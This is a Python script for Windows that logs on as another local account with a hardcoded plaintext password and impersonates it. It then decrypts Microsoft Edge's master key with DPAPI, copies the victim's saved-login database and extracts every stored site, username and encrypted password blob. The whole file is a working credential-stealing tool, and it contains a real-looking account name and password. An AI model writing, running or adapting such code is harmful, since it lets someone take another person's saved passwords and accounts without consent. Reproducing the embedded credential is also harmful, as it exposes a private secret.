import ctypes, ctypes.wintypes, os, sys

# Windows API constants
LOGON32_LOGON_INTERACTIVE = 2
LOGON32_PROVIDER_DEFAULT = 0

# Load advapi32
advapi32 = ctypes.windll.advapi32

# Try to get a token for osiris_admin
username = "osiris_admin"
domain = "laptop-nstd8t96"
password = "Pokemon55"

print("Attempting to logon as %s\\%s..." % (domain, username))

token = ctypes.wintypes.HANDLE()
result = advapi32.LogonUserW(
    username,
    domain,
    password,
    LOGON32_LOGON_INTERACTIVE,
    LOGON32_PROVIDER_DEFAULT,
    ctypes.byref(token)
)

if result:
    print("LOGGED ON SUCCESSFULLY!")
    print("Token handle: %d" % token.value)
    
    # Now try to impersonate
    result2 = advapi32.ImpersonateLoggedOnUser(token)
    if result2:
        print("Impersonated successfully!")
        print("Now running as: %s" % os.environ.get('USERNAME', 'unknown'))
        
        # Now try DPAPI
        import json, base64
        from ctypes import wintypes
        
        crypt32 = ctypes.windll.crypt32
        
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]
        
        def decrypt_dpapi(data):
            in_blob = DATA_BLOB(len(data), (ctypes.c_byte * len(data)).from_buffer_copy(data))
            out_blob = DATA_BLOB()
            result = crypt32.CryptUnprotectData(
                ctypes.byref(in_blob), None, None, None, None, 1, ctypes.byref(out_blob)
            )
            if result:
                decrypted = bytes(ctypes.string_at(out_blob.pbData, out_blob.cbData))
                crypt32.LocalFree(out_blob.pbData)
                return decrypted
            return None
        
        with open(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Local State", "r") as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        ciphertext = encrypted_key[5:]
        
        print("\nTrying DPAPI decrypt...")
        result = decrypt_dpapi(ciphertext)
        if result:
            print("DECRYPTED KEY: %s" % result.hex())
            
            # Now decrypt Edge passwords!
            import sqlite3
            
            db_path = r"C:\Users\BASEDGOD\Desktop\login_data_copy.db"
            if not os.path.exists(db_path):
                import shutil
                shutil.copy(r"C:\Users\osiris_admin\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", db_path)
            
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT id, origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            
            print("\n=== EDGE SAVED PASSWORDS ===")
            for row in rows:
                print("\nURL: %s" % row[1])
                print("Username: %s" % row[2])
                pw_blob = row[3]
                # AES-GCM decrypt with the key
                if len(pw_blob) > 3:
                    nonce = pw_blob[3:15]
                    ciphertext = pw_blob[15:-16]
                    tag = pw_blob[-16:]
                    print("Nonce: %s" % nonce.hex())
                    print("Ciphertext: %s" % ciphertext.hex())
                    print("Tag: %s" % tag.hex())
            
            conn.close()
        else:
            error = ctypes.GetLastError()
            print("DPAPI failed with error: %d" % error)
        
        advapi32.RevertToSelf()
    else:
        print("Impersonation failed: %d" % ctypes.GetLastError())
    
    ctypes.windll.kernel32.CloseHandle(token)
else:
    error = ctypes.GetLastError()
    print("Logon failed with error: %d" % error)
    print("Error description: ", end="")
    # Common errors
    if error == 1326:
        print("LOGON_FAILURE - wrong username or password")
    elif error == 1327:
        print("ACCOUNT_RESTRICTION")
    elif error == 1331:
        print("ACCOUNT_DISABLED")
    elif error == 1385:
        print("NO_LOGON_SERVERS")
    else:
        import ctypes
        buf = ctypes.create_unicode_buffer(256)
        ctypes.windll.kernel32.FormatMessageW(0x1000, None, error, 0, buf, 256, None)
        print(buf.value)
